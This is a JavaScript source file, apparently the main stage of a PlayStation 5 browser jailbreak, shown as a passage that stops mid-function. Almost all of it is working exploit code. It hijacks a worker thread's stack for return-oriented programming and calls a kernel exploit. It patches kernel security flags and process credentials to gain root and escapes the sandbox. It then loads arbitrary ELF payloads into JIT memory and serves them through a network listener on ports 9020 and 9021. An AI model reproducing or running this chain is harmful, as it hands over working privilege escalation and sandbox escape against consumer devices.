// @ts-check


/**
 * @typedef {Object} UserlandRW
 * @property {function(any, any): void} write8
 * @property {function(any, any): void} write4
 * @property {function(any, any): void} write2
 * @property {function(any, any): void} write1
 * @property {function(any): int64} read8
 * @property {function(any): number} read4
 * @property {function(any): number} read2
 * @property {function(any): number} read1
 * @property {function(any): int64} leakval
 */

/**
 * @typedef {Object} WebkitPrimitives
 * @property {function(any, any): void} write8
 * @property {function(any, any): void} write4
 * @property {function(any, any): void} write2
 * @property {function(any, any): void} write1
 * @property {function(any): int64} read8
 * @property {function(any): number} read4
 * @property {function(any): number} read2
 * @property {function(any): number} read1
 * @property {function(any): int64} leakval
 * 
 * @property {function(any): void} pre_chain
 * @property {function(any): Promise<void>} launch_chain
 * @property {function(any): int64} malloc_dump
 * @property {function(any, number=): int64} malloc
 * @property {function(int64, number): Uint8Array} array_from_address
 * @property {function(any): int64} stringify
 * @property {function(any, number=): string} readstr
 * @property {function(int64, string): void} writestr
 * 
 * @property {int64} libSceNKWebKitBase
 * @property {int64} libSceLibcInternalBase
 * @property {int64} libKernelBase
 * 
 * @property {any[]} nogc
 * @property {any} syscalls
 * @property {any} gadgets 
 */

if (!navigator.userAgent.includes('PlayStation 5')) {alert(`PlayStation 5 Exploit. => ${navigator.userAgent}`);throw new Error("");}
const supportedFirmwares = ["1.00", "1.01", "1.02", "1.05", "1.10", "1.11", "1.12", "1.13", "1.14", "2.00", "2.20", "2.25", "2.26", "2.30", "2.50", "2.70", "3.00", "3.10", "3.20", "3.21", "4.00", "4.02", "4.03", "4.50", "4.51", "5.00", "5.02", "5.10", "5.50"];
const fw_idx = navigator.userAgent.indexOf('PlayStation; PlayStation 5/') + 27;
window.fw_str = navigator.userAgent.substring(fw_idx, fw_idx + 4);
window.fw_float = parseFloat(fw_str);
if (!supportedFirmwares.includes(fw_str)) {alert(`Die Firmware ${fw_str} wird nicht unterstützt.`);throw new Error("");}
let nogc = [];
let worker = new Worker("rop_slave.js");
async function wait_for_worker() {
    let p1 = await new Promise((resolve) => {
        const channel = new MessageChannel();
        channel.port1.onmessage = () => {channel.port1.close();resolve(1);}
        worker.postMessage(0, [channel.port2]);
    });
    return p1;
}

/**
 * @param {UserlandRW|WebkitPrimitives} p 
 * @param {int64} buf 
 * @param {number} family 
 * @param {number} port 
 * @param {number} addr 
 */

function build_addr(p, buf, family, port, addr) {
    p.write1(buf.add32(0x00), 0x10);
    p.write1(buf.add32(0x01), family);
    p.write2(buf.add32(0x02), port);
    p.write4(buf.add32(0x04), addr);
}

/** 
 * @param {number} port
 * @returns {number}
 */

function htons(port) {return ((port & 0xFF) << 8) | (port >>> 8);}

/**
 * @param {UserlandRW|WebkitPrimitives} p 
 * @param {int64} libKernelBase 
 * @returns 
 */

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {return stack;}
    }
    throw new Error("Worker nicht gefunden.");
}


/**
 * @enum {number}
 */

var LogLevel = {
    DEBUG: 0,
    INFO: 1,
    LOG: 2,
    WARN: 3,
    ERROR: 4,
    SUCCESS: 5,
    FLAG_TEMP: 0x1000
};

let consoleElem = null;
let lastLogIsTemp = false;

/**
 * 
 * @param {string} string 
 * @param {LogLevel} level 
 */

function log(string, level) {
    if (consoleElem === null) {consoleElem = document.getElementById("console");}
    const isTemp = level & LogLevel.FLAG_TEMP;
    level = level & ~LogLevel.FLAG_TEMP;
    const elemClass = ["LOG-DEBUG", "LOG-INFO", "LOG-LOG", "LOG-WARN", "LOG-ERROR", "LOG-SUCCESS"][level];
    if (isTemp && lastLogIsTemp) {
        const lastChild = consoleElem.lastChild;
        lastChild.innerText = string;
        lastChild.className = elemClass;
        return;
    }
    else if (isTemp) {lastLogIsTemp = true;}
    let logElem = document.createElement("div");
    logElem.innerText = string;
    logElem.className = elemClass;
    consoleElem.appendChild(logElem);
    consoleElem.scrollTop = consoleElem.scrollHeight;
}

const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
const IPV6_PKTINFO = 46;

/**
 * @param {UserlandRW} p 
 * @returns {Promise<{p: WebkitPrimitives, chain: worker_rop}>}
 */

async function prepare(p) {
    let textArea = document.createElement("textarea");
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    let textAreaVtable = p.read8(textAreaVtPtr);
    let libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);
    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);
    let gadgets = {};
    let syscalls = {};
    for (let gadget in wk_gadgetmap) {gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);}
    for (let sysc in syscall_map) {syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);}
    let nogc = [];
    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);
        /** @type {any} */
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    /**
     * @param {number} sz 
     * @param {number} type 
     * @returns 
     */

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {backing = new Uint8Array(1000 + sz);}
        else if (type == 2) {backing = new Uint16Array(0x2000 + sz);}
        else if (type == 4) {backing = new Uint32Array(0x10000 + sz);}
        nogc.push(backing);
        /** @type {any} */
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);
        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }
        setAddr(addr, size);
        og_array.setAddr = setAddr;
        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {bufView[i] = str.charCodeAt(i) & 0xFF;}
        /** @type {any} */
        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) { break; }
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {break;}
            str += String.fromCharCode(c);
        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {
            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {break;}
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    async function wait_for_worker() {
        let p1 = await new Promise((resolve) => {
            const channel = new MessageChannel();
            channel.port1.onmessage = () => {channel.port1.close();resolve(1);}
            worker.postMessage(0, [channel.port2]);
        });
        return p1;
    }

    let worker = new Worker("rop_slave.js");
    await wait_for_worker();
    let worker_stack = find_worker(p, libKernelBase);
    let original_context = malloc(0x40);
    let return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);
    function pre_chain(chain) {
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }
    async function launch_chain(chain) {
        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);
        let p1 = await new Promise((resolve) => {
            const channel = new MessageChannel();
            channel.port1.onmessage = () => {channel.port1.close();resolve(1);}
            worker.postMessage(0, [channel.port2]);
        });
        if (p1 === 0) {throw new Error("ROP-Chain beendet.");}
    }

    /** @type {WebkitPrimitives} */
    let p2 = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: pre_chain,
        launch_chain: launch_chain,
        malloc_dump: malloc_dump,
        malloc: malloc,
        stringify: stringify,
        array_from_address: array_from_address,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    let chain = new worker_rop(p2);
    let pid = await chain.syscall(SYS_GETPID);
    if (pid.low == 0) {throw new Error("Exploit Fehlgeschlagen.");}
    return { p: p2, chain: chain };
}

/**
 * @param {UserlandRW} userlandRW
 * @param {boolean} wkOnly
 */

async function main(userlandRW, wkOnly = false) {
    const debug = false;
    const {p, chain} = await prepare(userlandRW);
    if (debug) await log("ROP-Chain initialisiert.", LogLevel.DEBUG);

    async function get_local_ips() {
        const SYSCALL_NETGETIFLIST = 0x07D;
        let ifaddr_count_buf = p.malloc(0x4);
        await chain.add_syscall_ret(ifaddr_count_buf, SYSCALL_NETGETIFLIST, 0, 10);
        await chain.run();
        let ifaddr_count = p.read4(ifaddr_count_buf);
        let if_addr_obj_size = 0x3C0;
        let if_addresses_length = if_addr_obj_size * ifaddr_count;
        let if_addresses = p.malloc(if_addresses_length);
        let ifaddrlist_ptr = if_addresses.add32(0x0);
        await chain.add_syscall(SYSCALL_NETGETIFLIST, ifaddrlist_ptr, ifaddr_count);
        await chain.run();
        let iplist = [];
        for (let i = 0; i < ifaddr_count; i++) {
            let adapterName = "";
            for (let i2 = 0; i2 < 16; i2++) {
                let char = p.read1(if_addresses.add32(if_addr_obj_size * i + i2));
                if (char == 0) {break;}
                adapterName += String.fromCharCode(char);
            }
            let ipAddress = "";
            for (let i2 = 40; i2 < 44; i2++) {
                ipAddress += p.read1(if_addresses.add32(if_addr_obj_size * i + i2)).toString(10) + ".";
            }
            ipAddress = ipAddress.slice(0, -1);
            iplist.push({ name: adapterName, ip: ipAddress });
        }
        return iplist;
    }

    let ip_list = await get_local_ips();
    let ip = ip_list.find(obj => obj.ip != "0.0.0.0");
    if (typeof ip === "undefined" || !ip.ip) {ip = {ip: "", name: "Offline"};}

    async function probe_sb_elfldr() {
        let fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
        if (fd <= 0) {return false;}
        let addr = p.malloc(0x10);
        build_addr(p, addr, AF_INET, htons(9021), 0x0100007F);
        let bind_res = (await chain.syscall(SYS_BIND, fd, addr, 0x10)).low << 0;
        await chain.syscall(SYS_CLOSE, fd);
        if (bind_res < 0) {return true;}
        return false;
    }

    let is_elfldr_running = await probe_sb_elfldr();
    await log("ELF-Loader Status: " + is_elfldr_running, LogLevel.INFO);
    if (wkOnly && !is_elfldr_running) {
        let res = confirm("ELF-Loader scheint nicht aktiv zu sein und wird im Webkit-Modus nicht nachgeladen. Weiter?");
        if (!res) {throw new Error("Abgebrochen");}
    }

    if (!wkOnly && is_elfldr_running) {
        let res = confirm("ELF-Loader scheint aktiv zu sein. Exploit überspringen und zu den Plugins wechseln?");
        if (res) {wkOnly = true;}
    }
    populatePayloadsPage(wkOnly);
    var load_payload_into_elf_store_from_local_file = async function (filename) {
        await log("Lade ELF-File: " + filename + " ...", LogLevel.LOG);
        const response = await fetch('payloads/' + filename);
        if (!response.ok) {throw new Error(`Binary konnte nicht geladen werden. Status: ${response.status}`);}
        const data = await response.arrayBuffer();
        let byteArray;
        if (elf_store.backing.BYTES_PER_ELEMENT == 1) {byteArray = new Uint8Array(data);}
        else if (elf_store.backing.BYTES_PER_ELEMENT == 2) {byteArray = new Uint16Array(data);}
        else if (elf_store.backing.BYTES_PER_ELEMENT == 4) {byteArray = new Uint32Array(data);}
        else {throw new Error(`Nicht unterstützt: ${elf_store.backing.BYTES_PER_ELEMENT}`);}
        elf_store.backing.fill(0);
        elf_store.backing.set(byteArray);
        return byteArray.byteLength;
    }

    let SIZE_ELF_HEADER = 0x40;
    let SIZE_ELF_PROGRAM_HEADER = 0x38;
    var elf_store_size = SIZE_ELF_HEADER + (SIZE_ELF_PROGRAM_HEADER * 0x10) + 0x1000000; // 16MB
    var elf_store = p.malloc(elf_store_size, 1);
    if (!wkOnly) {
        var krw = await runUmtx2Exploit(p, chain, log);
        function get_kaddr(offset) {return krw.ktextBase.add32(offset);}
        let security_flags = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
        await krw.write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);
        await krw.write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);
        let qaf_dword = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
        await krw.write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);
        let utoken_flags = await krw.read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
        await krw.write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
        await log("Debug-Menu aktiviert...", LogLevel.INFO);
        let cur_uid = await chain.syscall(SYS_GETUID);
        await log("current uid=0x" + cur_uid, LogLevel.INFO);
        await krw.write4(krw.procUcredAddr.add32(0x04), 0);
        await krw.write4(krw.procUcredAddr.add32(0x08), 0);
        await krw.write4(krw.procUcredAddr.add32(0x0C), 0);
        await krw.write4(krw.procUcredAddr.add32(0x10), 1);
        await krw.write4(krw.procUcredAddr.add32(0x14), 0);
        await krw.write8(krw.procUcredAddr.add32(0x58), new int64(0x00000013, 0x48010000));
        await krw.write8(krw.procUcredAddr.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF));
        await krw.write8(krw.procUcredAddr.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));
        await krw.write1(krw.procUcredAddr.add32(0x83), 0x80);
        let proc_pdynlib_offset = krw.curprocAddr.add32(0x3E8);
        let proc_pdynlib_addr = await krw.read8(proc_pdynlib_offset);
        let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
        await krw.write4(restrict_flags_addr, 0);
        let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
        await krw.write8(libkernel_ref_addr, new int64(1, 0));
        cur_uid = await chain.syscall(SYS_GETUID);
        await log("Root-Rechte erlangt? uid=0x" + cur_uid, LogLevel.INFO);
        let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
        await log("Jailbreaking... (in sandbox: " + is_in_sandbox + ")" , LogLevel.INFO);
        let rootvnode = await krw.read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
        await krw.write8(krw.procFdAddr.add32(0x10), rootvnode); // fd_rdir
        await krw.write8(krw.procFdAddr.add32(0x18), rootvnode); // fd_jdir
        is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
        await log("Sandbox-Escape erfolgreich? " + is_in_sandbox, LogLevel.INFO);
        if (typeof OFFSET_KERNEL_PS4SDK != 'undefined') {
            await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
            await log("PS4-Spoof 99.99", LogLevel.INFO);
        }
        let dlsym_addr = p.syscalls[SYS_DYNLIB_DLSYM];
        let jit_handle_store = p.malloc(0x4);
        let OFFSET_ELF_HEADER_ENTRY = 0x18;
        let OFFSET_ELF_HEADER_PHOFF = 0x20;
        let OFFSET_ELF_HEADER_PHNUM = 0x38;
        let OFFSET_PROGRAM_HEADER_TYPE = 0x00;
        let OFFSET_PROGRAM_HEADER_FLAGS = 0x04;
        let OFFSET_PROGRAM_HEADER_OFFSET = 0x08;
        let OFFSET_PROGRAM_HEADER_VADDR = 0x10;
        let OFFSET_PROGRAM_HEADER_MEMSZ = 0x28;
        let OFFSET_RELA_OFFSET = 0x00;
        let OFFSET_RELA_INFO = 0x08;
        let OFFSET_RELA_ADDEND = 0x10;
        let ELF_PT_LOAD = 0x01;
        let ELF_PT_DYNAMIC = 0x02;
        let ELF_DT_NULL = 0x00;
        let ELF_DT_RELA = 0x07;
        let ELF_DT_RELASZ = 0x08;
        let ELF_DT_RELAENT = 0x09;
        let ELF_R_AMD64_RELATIVE = 0x08;
        var conn_ret_store = p.malloc(0x8);
        let shadow_mapping_addr = new int64(0x20100000, 0x00000009);
        let mapping_addr = new int64(0x26100000, 0x00000009);
        let elf_program_headers_offset = 0;
        let elf_program_headers_num = 0;
        let elf_entry_point = 0;
        var parse_elf_store = async function (total_sz = -1) {
            elf_program_headers_offset = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHOFF));
            elf_program_headers_num = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHNUM)) & 0xFFFF;
            elf_entry_point = p.read4(elf_store.add32(OFFSET_ELF_HEADER_ENTRY));
            if (elf_program_headers_offset != 0x40) {
                await log("ELF-Header defekt. Abbruch.", LogLevel.ERROR);
                throw new Error("ELF-Header defekt. Abbruch.");
            }
            let text_segment_sz = 0;
            let data_segment_sz = 0;
            let rela_table_offset = 0;
            let rela_table_count = 0;
            let rela_table_size = 0;
            let rela_table_entsize = 0;
            /** @type {int64} */
            let shadow_write_mapping = 0;
            for (let i = 0; i < elf_program_headers_num; i++) {
                let program_header_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);
                let program_type = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_TYPE));
                let program_flags = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_FLAGS));
                let program_offset = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_OFFSET));
                let program_vaddr = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_VADDR));
                let program_memsz = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_MEMSZ));
                let aligned_memsz = (program_memsz + 0x3FFF) & 0xFFFFC000;
                if (program_type == ELF_PT_LOAD) {
                    if ((program_flags & 1) == 1) {
                        text_segment_sz = program_memsz;
                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_CREATE, 0x0, aligned_memsz, 0x7);
                        await chain.run();
                        let exec_handle = p.read4(jit_handle_store);
                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_ALIAS, exec_handle, 0x3);
                        await chain.run();
                        let write_handle = p.read4(jit_handle_store);
                        chain.add_syscall_ret(conn_ret_store, SYS_MMAP, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
                        await chain.run();
                        shadow_write_mapping = p.read8(conn_ret_store);
                        let dest = p.read8(conn_ret_store);
                        for (let j = 0; j < program_memsz; j += 0x8) {
                            let src_qword = p.read8(elf_store.add32(program_offset + j));
                            p.write8(dest.add32(j), src_qword);
                        }
                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x5, 0x11, exec_handle, 0);
                        await chain.run();
                    } else {
                        data_segment_sz = aligned_memsz;
                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x3, 0x1012, 0xFFFFFFFF, 0);
                        await chain.run();
                        let dest = mapping_addr.add32(program_vaddr);
                        for (let j = 0; j < program_memsz; j += 0x8) {
                            let src_qword = p.read8(elf_store.add32(program_offset + j));
                            p.write8(dest.add32(j), src_qword);
                        }
                    }
                }

                if (program_type == ELF_PT_DYNAMIC) {
                    for (let j = 0x00; ; j += 0x10) {
                        let d_tag = p.read8(elf_store.add32(program_offset + j)).low;
                        let d_val = p.read8(elf_store.add32(program_offset + j + 0x08));
                        if (d_tag == ELF_DT_NULL || j > 0x100) {break;}
                        switch (d_tag) {
                            case ELF_DT_RELA:
                                rela_table_offset = d_val.low;
                                break;
                            case ELF_DT_RELASZ:
                                rela_table_size = d_val.low;
                                break;
                            case ELF_DT_RELAENT:
                                rela_table_entsize = d_val.low;
                                break;
                        }
                    }
                }
            }

            if (rela_table_offset != 0) {
                let base_address = 0x1000;
                rela_table_offset += base_address;
                rela_table_count = rela_table_size / rela_table_entsize;
                for (let i = 0; i < rela_table_count; i++) {
                    let r_offset = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_OFFSET));
                    let r_info = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_INFO));
                    let r_addend = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_ADDEND));
                    let reloc_addr = mapping_addr.add32(r_offset.low);
                    if (r_offset.low <= text_segment_sz) {reloc_addr = shadow_write_mapping.add32(r_offset.low);}
                    if ((r_info.low & 0xFF) == ELF_R_AMD64_RELATIVE) {let reloc_value = mapping_addr.add32(r_addend.low);p.write8(reloc_addr, reloc_value);}
                }
            }
        }

        let rwpair_mem = p.malloc(0x8);
        let test_payload_store = p.malloc(0x8);
        let pthread_handle_store = p.malloc(0x8);
        let pthread_value_store = p.malloc(0x8);
        let args = p.malloc(0x8 * 6);
        var execute_elf_store = async function () {
            p.write8(rwpair_mem, 0);
            p.write8(rwpair_mem.add32(0x4), 0);
            p.write8(test_payload_store, 0);
            p.write8(pthread_handle_store, 0);
            p.write8(pthread_value_store, 0);
            for (let i = 0; i < 0x8 * 6; i++) {p.write1(args.add32(i), 0);}
            p.write4(rwpair_mem.add32(0x00), krw.masterSock);
            p.write4(rwpair_mem.add32(0x04), krw.victimSock);
            p.write8(args.add32(0x00), dlsym_addr);
            p.write8(args.add32(0x08), krw.pipeMem);
            p.write8(args.add32(0x10), rwpair_mem);
            p.write8(args.add32(0x18), krw.pipeAddr);
            p.write8(args.add32(0x20), krw.kdataBase);
            p.write8(args.add32(0x28), test_payload_store);
            await log("Gestartet...", LogLevel.INFO);
            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));
        }

        /**
         * @returns Promise<number> - The return value of the payload
         */

        var wait_for_elf_to_exit = async function () {
            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
            let res = p.read8(test_payload_store).low << 0;
            await log("Fertig. 0x" + res.toString(16), LogLevel.LOG);
            return res;
        }

        var load_local_elf = async function (filename) {
            try {
                let total_sz = await load_payload_into_elf_store_from_local_file(filename);
                await parse_elf_store(total_sz);
                await execute_elf_store();
                return await wait_for_elf_to_exit();
            } catch (error) {
                await log("ELF-File konnte nicht geladen werden: " + error, LogLevel.ERROR);
                return -1;
            }
        }

        if (await load_local_elf("elfldr.elf") == 0) {
            await log(`ELF-Loader aktiv. ${ip.ip}:9021`, LogLevel.INFO);
            is_elfldr_running = true;
        } else {
            await log("ELF-Loader mit Fehlercode beendet.", LogLevel.ERROR);
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        var elf_loader_socket_fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low;
        if (elf_loader_socket_fd <= 0) {throw new Error("ELF-Loader-Socket konnte nicht gestartet werden.");}
        var elf_loader_sock_addr_store = p.malloc(0x10, 1);
        build_addr(p, elf_loader_sock_addr_store, AF_INET, htons(9020), 0);
        let SOL_SOCKET = 0xFFFF;
        let SO_REUSEADDR = 0x0004;
        let opt_buf = p.malloc(0x4, 1);
        p.write4(opt_buf, 1);
        let setsockopt_res = (await chain.syscall(SYS_SETSOCKOPT, elf_loader_socket_fd, SOL_SOCKET, SO_REUSEADDR, opt_buf, 0x4)).low << 0;
        if (setsockopt_res < 0) {throw new Error("ELF-Loader-Socket konnte nicht gestartet werden.");}
        let bind_res = (await chain.syscall(SYS_BIND, elf_loader_socket_fd, elf_loader_sock_addr_store, 0x10)).low << 0;
        if (bind_res < 0) {throw new Error("ELF-Loader-Socket konnte nicht gestartet werden.");}
        let backlog = 16;
        let listen_res = (await chain.syscall(SYS_LISTEN, elf_loader_socket_fd, backlog)).low << 0;
        if (listen_res < 0) {throw new Error("ELF-Loader-Socket konnte nicht gestartet werden.");}
        var conn_addr_store = p.malloc(0x10, 1);
        var conn_addr_size_store = p.malloc(0x4, 1);
        var select_readfds_size = 1024 / 8;
        var select_readfds = p.malloc(select_readfds_size, 1);
        var timeout_size = 0x10;
        var timeout = p.malloc(timeout_size);
        p.write8(timeout, 0);
        p.write8(timeout.add32(0x8), 50000);
        await log("ELF-Loader aktiv. Port 9020", LogLevel.INFO);
    }

    async function fstat(fd, stat_buf) {
        if (stat_buf.backing.byteLength < 0x78) {throw new Error("Buffer zu klein.");}
        let res = (await chain.syscall(SYS_FSTAT, fd, stat_buf)).low << 0;
        if (res < 0) {throw new Error("Fehler im File-Status " + res);}
        let st_rdev = p.read4(stat_buf.add32(20));
        let st_atim_tv_sec = p.read8(stat_buf.add32(24));
        let st_atim = new Date(st_atim_tv_sec.low * 1000 + st_atim_tv_sec.hi / 1000);
        let st_mtim_tv_sec = p.read8(stat_buf.add32(40));
        let st_mtim = new Date(st_mtim_tv_sec.low * 1000 + st_mtim_tv_sec.hi / 1000);
        let st_ctim_tv_sec = p.read8(stat_buf.add32(56));
        let st_ctim = new Date(st_ctim_tv_sec.low * 1000 + st_ctim_tv_sec.hi / 1000);
        let st_size = p.read8(stat_buf.add32(72));
        if (st_size.hi !== 0) {throw new Error("Datei zu gross.");}
        let st_blksize = p.read4(stat_buf.add32(88));
        let st_flags = p.read4(stat_buf.add32(92));
        let st_birthtim_tv_sec = p.read8(stat_buf.add32(104));
        let st_birthtim = new Date(st_birthtim_tv_sec.low * 1000 + st_birthtim_tv_sec.hi / 1000);

        return {
            st_rdev: st_rdev,
            st_atim: st_atim,
            st_mtim: st_mtim,
            st_ctim: st_ctim,
            st_size: st_size.low,
            st_blksize: st_blksize,
            fflags_t: st_flags,
            st_birthtim: st_birthtim,
        };
    }

    const DT_DIR = 4;

    async function ls(path, temp_buf) {
        if (!temp_buf.backing) {throw new Error("Buffer-json nicht aktiv.");}
        let temp_buf_size = temp_buf.backing.byteLength;
        if (temp_buf_size < 0x108 || temp_buf_size < path.length + 1) {throw new Error("Buffer zu klein.");}
        if (path.endsWith("/") && path !== "/") {path = path.slice(0, -1);}
        let bufferDataView = new DataView(temp_buf.backing.buffer, temp_buf.backing.byteOffset, temp_buf_size);
        const O_DIRECTORY = 0x00020000;
        /** @type {{d_fileno: number, d_reclen: number, d_type: number, d_namlen: number, d_name: string}[]} */
        let result = [];
        p.writestr(temp_buf, path);
        let dir_fd = (await chain.syscall(SYS_OPEN, temp_buf, O_DIRECTORY)).low << 0;
        if (dir_fd < 0) {throw new Error(`'${path}' nicht gefunden.`);}
        try {
            let stat = await fstat(dir_fd, temp_buf);
            let block_size = stat.st_blksize;
            if (block_size <= 0) {throw new Error("Block fehlerhaft.");}
            if (temp_buf_size < block_size) {throw new Error("Buffer zu klein. Minimum: " + block_size);}
            let total_bytes_read = 0;
            let total_files = 0;
            while (true) {
                let bytes_read = (await chain.syscall(SYS_GETDIRENTRIES, dir_fd, temp_buf, temp_buf_size, 0)).low << 0;
                if (bytes_read < 0) {throw new Error("Pfad nicht gefunden.");}
                if (bytes_read == 0) {break;}
                let offset = 0;
                let loops = 0;
                while (offset < bytes_read) {
                    loops++;
                    let d_fileno = bufferDataView.getUint32(offset, true);
                    let d_reclen = bufferDataView.getUint16(offset + 4, true);
                    let d_type = bufferDataView.getUint8(offset + 6);
                    let d_namlen = bufferDataView.getUint8(offset + 7);
                    let d_name = "";
                    for (let i = 0; i < d_namlen; i++) {d_name += String.fromCharCode(bufferDataView.getUint8(offset + 8 + i));}
                    result.push({ d_fileno, d_reclen, d_type, d_namlen, d_name });
                    offset += d_reclen;
                    total_files++;
                }
                total_bytes_read += bytes_read;
            }
            return result;
        } finally {
            await chain.syscall(SYS_CLOSE, dir_fd);
            if (temp_buf.backing) {temp_buf.backing.fill(0);}
        }
    }

    /**
     * @param {function(string): void} [log]
     */

    async function delete_appcache(log = () => { }) {
        let user_home_entries = await ls("/user/home", elf_store);
        let user_ids = user_home_entries.reduce((acc, dirent) => {
            if (dirent.d_type === DT_DIR && dirent.d_name !== "." && dirent.d_name !== "..") {
                let user_id = dirent.d_name;
                acc.push(user_id);
            }
            return acc;
        }, []);
        if (user_ids.length === 0) {throw new Error("Keine Benutzer gefunden.");}
        async function unlink(path) {
            p.writestr(elf_store, path);
            return await chain.syscall_int32(SYS_UNLINK, elf_store);
        }
        for (let user_id of user_ids) {
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db`);
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-shm`);
